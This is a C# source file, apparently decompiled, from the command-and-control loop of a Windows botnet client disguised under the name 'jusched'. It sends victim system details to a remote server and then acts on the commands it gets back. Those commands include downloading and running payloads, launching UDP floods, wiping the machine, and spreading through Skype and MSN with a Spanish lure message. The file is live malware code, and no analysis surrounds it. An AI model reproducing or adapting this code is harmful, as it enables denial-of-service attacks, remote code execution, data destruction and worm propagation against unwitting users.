using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using jusched.Security;

namespace jusched;

public class HttpHandler
{
	public static Thread gateway_0 = new Thread(notifyuri);

	[DebuggerNonUserCode]
	public HttpHandler()
	{
	}

	[DllImport("dnsapi.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern uint DnsFlushResolverCache();

	private static void notifyuri()
	{
		while (true)
		{
			try
			{
				new UTF8Encoding();
				string s = "JJ=" + Crypto.EncryptData(Configuration.pcname) + "&NN=" + Crypto.EncryptData(Configuration.ver) + "&EE=" + Crypto.EncryptData(Configuration.pais) + "&GG=" + Crypto.EncryptData(Configuration.winver) + "&QQ=" + Crypto.EncryptData(FingerPrint.Value());
				byte[] bytes = Encoding.ASCII.GetBytes(s);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Configuration.uriserver);
				httpWebRequest.Method = "POST";
				httpWebRequest.KeepAlive = false;
				httpWebRequest.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest.UserAgent = "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00";
				httpWebRequest.ContentLength = bytes.Length;
				httpWebRequest.Proxy = null;
				Stream requestStream = httpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string enctext = streamReader.ReadToEnd();
				string text = Crypto.DecryptData(enctext).ToString();
				string[] array = text.Split(new char[1] { '*' });
				if (text.StartsWith("visit"))
				{
					Process.Start(array[1]);
				}
				else if (text.StartsWith("downandexe"))
				{
					Utils.DownloadAndRun(array[1]);
				}
				else if (text.StartsWith("udpflood"))
				{
					take.down.H_H_H_H = array[1];
					take.down.P_P_P_P = Conversions.ToInteger(array[2]);
					take.down.T_T_T_T = Conversions.ToInteger(array[3]);
					take.down.U_U_U_U = Conversions.ToInteger(array[4]);
					take.down.S_S_S_S = Conversions.ToInteger(array[5]);
					take.down.NqtvkDZTAjYMaEDnbjghQrl();
				}
				else if (text.StartsWith("stop"))
				{
					take.down.uOiXCHFkkjFociRWPEHsfPE();
				}
				else if (text.StartsWith("diebitch"))
				{
					global_0.wipe();
				}
				else if (text.StartsWith("update"))
				{
					global_0.DownloadAndExecuteUpdate(array[1]);
				}
				else if (text.StartsWith("skype"))
				{
					SkypeSP.NICE();
				}
				else if (text.StartsWith("msn"))
				{
					Msnspread.MYmessage = "oye te acuerdas de esta foto http://goo.gl/0xEnm ?";
					Msnspread.MsnStart();
				}
				else
				{
					try
					{
						take.down.uOiXCHFkkjFociRWPEHsfPE();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				DnsFlushResolverCache();
				take.down.uOiXCHFkkjFociRWPEHsfPE();
				ProjectData.ClearProjectError();
			}
		}
	}
}
